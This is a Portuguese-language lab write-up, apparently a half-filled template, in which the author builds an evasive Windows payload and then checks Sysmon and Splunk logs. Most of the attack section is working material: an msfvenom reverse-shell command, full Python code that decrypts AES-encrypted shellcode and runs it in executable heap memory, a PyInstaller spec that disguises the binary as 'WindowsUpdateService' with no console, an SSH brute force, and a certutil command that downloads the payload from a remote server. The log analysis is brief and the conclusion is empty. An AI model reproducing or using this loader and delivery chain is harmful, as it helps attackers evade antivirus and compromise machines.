# 🛡️ [TÍTULO DO ARTIGO AQUI]
> *Exemplo: Detectando Injeção de DLL com Sysmon e Splunk*

## 📌 Resumo
Neste eu criei um malware usando veil e apliquei algumas tecnicas de obfuscacao e encryptacao com o objetivo de passar pela seguranca de uma 
virtual machine e observar a reacao do sistema de defesa e os logs gerados por splunk e sysmon infelizmente (ou felizmente) o malware foi detectado pelo sistema windows 
assim que foi baixado, entretanto todo o processo de criacao e execucao geraram muito conhecimento pratico que eu vou registrar aqui.  

---

## ⚙️ Ambiente de Testes

| Componente     | Detalhes                                          |
|----------------|---------------------------------------------------|
| Atacante       | Kali Linux (versão XX)                            |
| Alvo           | Windows 10 (versão XX) com Sysmon                 |
| Ferramentas    | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
| Técnica usada  | Reverse Shell / etc.  |

---


## 🧪 DETALHES TECNICOS 
 Durante a instalacao do Splunk eu tive alguns problemas para recebecer os logs sysmon no splunk GUI depois de muito procurar eu descobri que 
 era um problema de permissoes do windows 

 (PRINT DO PROGRAMA SERVICES/SPLUNK)
 ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)

 E necessario que se insira este comando no arquivo input do splunk para receber os logs 
  
  (PRINT DO ARQUIVO DE CONFIGURACAO SPLUNK)
![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)




## 🧪 SOBRE O MALWARE E OFUSCACAO 
 Para este artigo eu escolhi usar um shellcode metasploist e obfusca-lo com codigo python para este proposito foi escolhido esta opcao 
  Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string

```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```

(PRINT PAYLOAD metasploit)

comando para converter o resultado em codigo hexadecimal 

```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```

   (PRINT DA ENCRIPTACAO HEXADECIMAL)
   ![Image](https://github.com/user-attachments/assets/4263f989-ef76-4d00-936e-32da016fc588)

  Logo apos eu usei este codigo python para converter a saida do comando anterior em uma versao encryptada usando uma chave AES de 16 bytes (128 bits),
  isso vai ajudar bypass o sistema de defesa do windows tornando mais dificil para o antivirus indentificar o codigo malicioso dentro do executavel 

[PRINT DO VS CODE ENCRYPTACAO]
![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)

Agora nos temos um shellcode pronto para ser inserido no codigo 

# Diferenca entre *VirtualAlloc e xml HeapAlloc*     

   Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
 pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
 e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```xml xmlVirtualAlloc + WriteProcessMemory + CreateRemoteThread```)
 e por ja ter sido muito usada ja e conhecida por antivirus.
 
 s2  ```xml HeapAlloc``` por outro lado usa um pedaco pequeno da memoria disponivel e e metodo muito usado pela maioria dos programas isso torna essa opcao 
 muito menos suspeita o ponto negativo e que o pedaco de memoria alocado inicialmente nao pode executar o codigo entao e necessario a execucao de outro comando depois ```xml HEAP_CREATE_ENABLE_EXECUTE```
 para liberar a execucao. Como o objetivo e bypass as defesas do windows eu escolhi a segunda opcao.

 **NOTE:** Enquanto escrevia este artigo descobri que a opcao  ```VirtualAlloc + VirtualProtect``` pode ser mais eficiente em bypass o sistema de defesa, vou testar isso em artigos futuros 

 Esse foi o codigo adquirido na internet para descriptografar um shellcode usando AES-CBC, 
 alocar memória executável em uma heap privada no processo atual e executar o shellcode via CreateThread o shellcode encryptografado esta na variavel encrypted_b64:

 ```Python
import base64
import ctypes
from Crypto.Cipher import AES

# === KEY AND IV (must match those used during encryption) ===
key = b'ThisIsA16ByteKey'
iv = b'ThisIsA16ByteIV!'

# === Encrypted shellcode (base64) ===
encrypted_b64 = b"2G8Rv5XtiV6HwQS/DsUBAOQB+pUlMLPJ+KwsV9Ixm8ym6BdI7s5kNf0Qw++2d7qKp3ykcrNXnodX8a"
encrypted = base64.b64decode(encrypted_b64)

# === Decrypt using AES-CBC ===
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

# === Remove PKCS7 padding ===
pad_len = decrypted[-1]
shellcode = decrypted[:-pad_len]

# === Create a private heap ===
heap = ctypes.windll.kernel32.HeapCreate(0x00040000, len(shellcode), 0)  # HEAP_CREATE_ENABLE_EXECUTE
if not heap:
    raise Exception("HeapCreate failed")

# === Allocate executable memory in the heap ===
ptr = ctypes.windll.kernel32.HeapAlloc(heap, 0x00000008, len(shellcode))  # HEAP_ZERO_MEMORY
if not ptr:
    raise Exception("HeapAlloc failed")

# === Copy shellcode to the heap ===
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_void_p(ptr),
    shellcode,
    len(shellcode)
)

# === Execute the shellcode ===
ht = ctypes.windll.kernel32.CreateThread(
    None,
    0,
    ctypes.c_void_p(ptr),
    None,
    0,
    None
)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
 ```
    
## 🧪 GERANDO UM EXCUTAVEL

Apos ter configurado o codigo foi usado este comando para gerar o executavel usando wine no kali linux

```bash
wine cmd
pyinstaller --noconfirm --onefile malwareobfuscated.py
```
![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)


Entretando nos adicionamos mais um degrau de obfuscacao editando o arquivo .spec, com o objetivo de parecer ao maximo um programa normal
do windows. 

**.SPEC FILE** 

```bash
# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['malwareobfuscated.py'],
    pathex=['.'],
    binaries=[],
    datas=[],
    hiddenimports=[],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=2,  # enable bytecode optimization
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='WindowsUpdateService',  # process name — mimics a legitimate system service
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,  # strip debug symbols from executable
    upx=True,  # apply UPX compression to reduce file size
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # hide console window 
    disable_windowed_traceback=True,  # disable error pop-ups on crash
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=True,
    upx=True,
    name='WindowsUpdateService'
)

```


This build configuration utilizes the PyInstaller .spec file (resulted from the last command)  to generate a standalone Windows executable that mimics a legitimate system process.
The output binary is named WindowsUpdateService.exe, leveraging process masquerading as an evasion technique. The executable is stripped of debug symbols, compressed using UPX, and runs silently without a console window, 
reducing forensic visibility. No external dependencies are bundled, keeping the footprint minimal. 

After configure the .spec file we generate the final executable from the .spec in a same folder of the code:

```bash
wine cmd
pyinstaller malwareobfuscated.spec
```

![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)

[ PRINT OF CREATED MALWARE]
![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)


## DELIVERING THE PAYLOAD 

Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o payload
para realizar a requisicao vamos testar alguns executaveis nativos do windowns para aumentar o nivel de ofucacao

[PRINT HYDRA]
![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)

 ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
 
 [PRINT CERTUTIL COMMAND]
![Image](https://github.com/user-attachments/assets/30188fa6-c789-4413-b6bb-342a29d9f40c)



Certutil.exe é uma Living-off-the-Land Binary (LOLBAS) usada por atacantes para baixar cargas maliciosas via HTTP, 
mas também, como podemos ver pelo output muito monitorada por antivirus modernos. Infelizmente eu nao consegui ofuscar o antivirus p suficiente deste vez 
porem ainda podemos analisar os logs gerados durante a acao.

![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)




---

## 🔍 Coleta e Análise dos Logs

### 📁 Splunk - Configuração
Trecho da config usada (ou link para ela).


*TENTATIVAS DE LOGIN*
A principio o que mais acenederia um alerta analisando os logs em splunk seria a quantidade de tentantivas 
de login via ssh em um curto espaco de tempo caraterizando um brute force attack 

*LOGS EM SPLUNK*

![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)



Como o malware foi bloquado antes de ser executado no foram gerados muitos logs em sysmon 
porem dois logs me chamaram a atencao: 

1. [Creation of Remote Treat]
 ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)

2. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)






##CONCLUSAO 





